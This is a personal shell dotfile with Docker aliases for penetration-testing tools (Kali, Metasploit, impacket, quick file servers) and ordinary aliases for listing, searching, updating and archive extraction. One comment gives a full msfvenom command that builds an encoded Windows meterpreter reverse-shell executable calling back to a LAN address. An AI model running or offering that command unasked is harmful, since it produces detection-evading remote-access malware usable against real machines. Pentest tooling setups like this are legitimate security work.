###############################Save .dotfiles to github
# Use a .gitignore with only an '*'
# then
# git add -f FILEorFOLDER
# Use ~/dotfiles.sh to update everything

#### Docker -> https://blog.ropnop.com/docker-for-pentesters/ && https://medium.com/@nima.saed/metasploit-framework-console-on-docker-with-workspace-fc39f0f2a078
alias kali='docker run -it -v "${HOME}/kali:/root/" kalilinux/kali-linux-docker /bin/bash'
#example: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.238 LPORT=8443 -b "\x00" -i 5 -e x86/shikata_ga_nai -f exe -o /home/msf/.msf4/tryme.exe
alias msfvenom='docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" -p 5432:5432 metasploitframework/metasploit-framework ./msfvenom'
alias metasploit='msf-docker'  
alias webdavhere='docker run --rm -it -p 80:80 -v "${PWD}:/srv/data/share" rflathers/webdav'
alias nginxhere='docker run --rm -it -p 80:80 -p 443:443 -v "${PWD}:/srv/data" -v "${PWD}/config:/etc/nginx" rflathers/nginxserve'
alias impacket="docker run --rm -it rflathers/impacket" 
alias dockershell="docker run --rm -i -t --entrypoint=/bin/bash"
alias dockershellsh="docker run --rm -i -t --entrypoint=/bin/sh"

function msf-docker() {
     if [ -z "$(docker network ls | grep -w msf)" ];
     then      
	     docker network create --subnet=172.18.0.0/16 msf  
     fi  
     if [ -z "$(docker ps -a | grep -w postgres)" ];
     then      
	     docker run --ip 172.18.0.2 --network msf --rm --name postgres -v "${HOME}/.msf4/database:/var/lib/postgresql/data" -e POSTGRES_PASSWORD=postgres -e POSTGRES_USER=postgres -e POSTGRES_DB=msf -d postgres:latest  
     fi   
     docker run --rm -it -u 0 --network msf --name msf --ip 172.18.0.3 -v "${HOME}/.msf4:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework 
}

function dockershellhere() {
    dirname=${PWD##*/}
    docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} "$@"
}
function dockershellshhere() {
    dirname=${PWD##*/}
    docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} "$@"
}

##### BASH
# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'


########### My Aliases
export EDITOR=vim
alias slideshw='feh --recursive --randomize --draw-filename -F -P --slideshow-delay 10'
alias slideshw-not-random='feh --recursive --draw-filename -F -P --slideshow-delay 10'
alias src='source $HOME/.zshrc'
alias ll='ls -alh'
alias gti='for i in * ; do guetzli --verbose "$i" "$i" ; done'
alias ssh-pi='ssh -p 2222 pi@192.168.1.2'
alias vpn_launch='/bin/bash /home/ldnpub/.vpn/vpn_launch.sh'
alias pyserver='iplan && python3 -m http.server 4444'
alias iplan='ip a | grep 192 | awk '\''{print $2}'\'''
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias src='source ${HOME}/.zshrc'
alias bat='batcat'

# Ubuntu
alias fupgrade='sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y && sudo snap refresh'
#

# Command line head / tail shortcuts
#alias -g H='| head'
#alias -g T='| tail'
#alias -g G='| grep'
#alias -g L="| less"
#alias -g M="| most"
#alias -g LL="2>&1 | less"
#alias -g CA="2>&1 | cat -A"
#alias -g NE="2> /dev/null"
#alias -g NUL="> /dev/null 2>&1"
#alias -g P="2>&1| pygmentize -l pytb"

alias dud='du -d 1 -h'
alias duf='du -sh *'
alias fd='find . -type d -name'
alias ff='find . -type f -name'

#
# # ex - archive extractor
# # usage: ex <file>
ex ()
{
  if [ -f $1 ] ; then
    case $1 in
      *.tar.bz2)   tar xjf $1   ;;
      *.tar.gz)    tar xzf $1   ;;
      *.bz2)       bunzip2 $1   ;;
      *.rar)       unrar x $1     ;;
      *.gz)        gunzip $1    ;;
      *.tar)       tar xf $1    ;;
      *.tbz2)      tar xjf $1   ;;
      *.tgz)       tar xzf $1   ;;
      *.zip)       unzip $1     ;;
      *.Z)         uncompress $1;;
      *.7z)        7z x $1      ;;
      *)           echo "'$1' cannot be extracted via ex()" ;;
    esac
  else
    echo "'$1' is not a valid file"
  fi
}


